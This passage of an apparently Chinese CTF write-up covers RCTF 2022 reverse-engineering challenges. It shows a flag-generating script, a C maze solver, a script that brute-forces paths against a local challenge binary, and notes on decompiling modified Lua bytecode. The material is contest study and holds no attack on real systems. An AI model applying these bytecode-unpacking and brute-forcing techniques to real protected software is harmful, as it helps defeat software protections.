class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_serial</span>(<span class="params">minute</span>):</span></span><br><span class="line">    mask = <span class="string">&#x27;xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx&#x27;</span></span><br><span class="line">    tmp = minute + <span class="number">0</span> * <span class="number">100</span> + <span class="number">11</span> * <span class="number">10000</span> + <span class="number">11</span> * <span class="number">1000000</span> + <span class="number">2022</span> * <span class="number">100000000</span> - <span class="number">1</span></span><br><span class="line">    tmp &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">    serial = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mask)):</span><br><span class="line">        mask_i = <span class="built_in">ord</span>(mask[i])</span><br><span class="line">        <span class="keyword">if</span> mask_i != <span class="number">52</span> <span class="keyword">and</span> mask_i != <span class="number">45</span>:</span><br><span class="line">            c, tmp = calc_one(tmp)</span><br><span class="line">            <span class="keyword">if</span> mask_i == <span class="number">120</span>:</span><br><span class="line">                serial += tohex(c)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                serial += tohex((c &amp; <span class="number">3</span>) | <span class="number">8</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            serial += <span class="built_in">chr</span>(mask_i)</span><br><span class="line">    <span class="keyword">return</span> serial</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;RCTF&#123;&#123;<span class="subst">&#123;generate_serial(<span class="number">54</span>)&#125;</span>&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="huowang"><a href="#huowang" class="headerlink" title="huowang"></a>huowang</h2><p><img src="/img/article/20221212/5.png" alt="huowang"></p><p>有两个迷宫，第一个是用 unicorn 跑的，里面碰壁了就会触发 exit 系统调用（0x3c），走到终点就会触发 write 系统调用（1），这个地图不太好提出来。</p><p>而第二个迷宫就是常规迷宫了，注意到二者用到的输入序列相同，所以先把第二个迷宫所有路径求出来，再一个个试就行了。</p><p>找个脚本小改一下输出迷宫 2 的所有路径：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> M 23</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 23</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_SIZE 10000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> mg[M + <span class="number">2</span>][N + <span class="number">2</span>] = &#123;</span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">    &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    <span class="keyword">int</span> di;</span><br><span class="line">&#125;St[MAX_SIZE], Path[MAX_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> top = <span class="number">-1</span>; <span class="comment">//栈顶指针</span></span><br><span class="line"><span class="keyword">int</span> cnt = <span class="number">1</span>; <span class="comment">//路径数计数</span></span><br><span class="line"><span class="keyword">int</span> minlen = MAX_SIZE; <span class="comment">//最短路径长度</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">disp_path</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> k;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">1</span>; k &lt;= top; k++) &#123;</span><br><span class="line">        <span class="keyword">int</span> dx = St[k].i - St[k - <span class="number">1</span>].i, dy = St[k].j - St[k - <span class="number">1</span>].j;</span><br><span class="line">        <span class="keyword">if</span> (dy == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dx == <span class="number">1</span>) <span class="built_in">printf</span>(<span class="string">&quot;s&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;w&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (dy == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;d&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (top + <span class="number">1</span> &lt; minlen)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt;= top; k++)</span><br><span class="line">            Path[k] = St[k];</span><br><span class="line">        minlen = top + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">mg_path</span><span class="params">(<span class="keyword">int</span> xi, <span class="keyword">int</span> yi, <span class="keyword">int</span> xe, <span class="keyword">int</span> ye)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, i1, j1, di;</span><br><span class="line">    <span class="keyword">bool</span> is_find;</span><br><span class="line"></span><br><span class="line">    top++;</span><br><span class="line">    St[top].i = xi;</span><br><span class="line">    St[top].j = yi;</span><br><span class="line">    St[top].di = <span class="number">-1</span>; mg[xi][yi] = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">while</span> (top &gt; <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        i = St[top].i; j = St[top].j;</span><br><span class="line">        di = St[top].di;</span><br><span class="line">        <span class="keyword">if</span> (i == xe &amp;&amp; j == ye)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">disp_path</span>();</span><br><span class="line">            mg[i][j] = <span class="number">0</span>;</span><br><span class="line">            top--;</span><br><span class="line">            i = St[top].i; j = St[top].j;</span><br><span class="line">            di = St[top].di;</span><br><span class="line">        &#125;</span><br><span class="line">        is_find = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">while</span> (di &lt; <span class="number">4</span> &amp;&amp; !is_find)</span><br><span class="line">        &#123;</span><br><span class="line">            di++;</span><br><span class="line">            <span class="built_in"><span class="keyword">switch</span></span> (di)</span><br><span class="line">            &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                i1 = i - <span class="number">1</span>;</span><br><span class="line">                j1 = j;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                i1 = i;</span><br><span class="line">                j1 = j + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                i1 = i + <span class="number">1</span>;</span><br><span class="line">                j1 = j;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                i1 = i;</span><br><span class="line">                j1 = j - <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (mg[i1][j1] == <span class="number">0</span>)</span><br><span class="line">                is_find = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (is_find)</span><br><span class="line">        &#123;</span><br><span class="line">            St[top].di = di;</span><br><span class="line">            top++; St[top].i = i1, St[top].j = j1;</span><br><span class="line">            St[top].di = <span class="number">-1</span>;</span><br><span class="line">            mg[i1][j1] = <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            mg[i][j] = <span class="number">0</span>;</span><br><span class="line">            top--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">mg_path</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">23</span>, <span class="number">22</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将输出的路径存放到 path.txt 中，再用脚本爆破即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;path.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    paths = f.read().split(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> path <span class="keyword">in</span> paths:</span><br><span class="line">    p = Popen([<span class="string">&quot;./HuoWang&quot;</span>], stdin=PIPE, stdout=PIPE, stderr=DEVNULL)</span><br><span class="line">    p.stdin.write(path + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    p.stdin.flush()</span><br><span class="line">    output = p.stdout.read()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;GrandFather&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">print</span>(path.decode())</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="picStore-re"><a href="#picStore-re" class="headerlink" title="picStore(re)"></a>picStore(re)</h2><p>动调跟 luaL_loadfilex，发现程序修改了 lua 引擎的 LoadByte, LoadInt, LoadInteger, LoadNumber 函数，对经过这四个函数的每个读出的字节，都会进行如下判断和变换：</p><p><img src="/img/article/20221212/6.png" alt="picStore"></p><p>按照相同的改法修改 Lua5.3.3 代码并重新编译，替换 luadec 自带的 lua-5.3 项目，反编译失败，只能拿到反汇编代码。因此考虑更换 unluac 工具，在修改了的 lua 交互执行环境中用 string.dump 将明文的 picStore.luac dump 出来，再用 unluac 反编译并进行代码美化。</p><p>其中和 re 有关的函数有两个，分别是 check_impl 和 check_func。check_impl 将 30 个 note 中的字符读出拼接并传入 check_func 进行检查：</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span 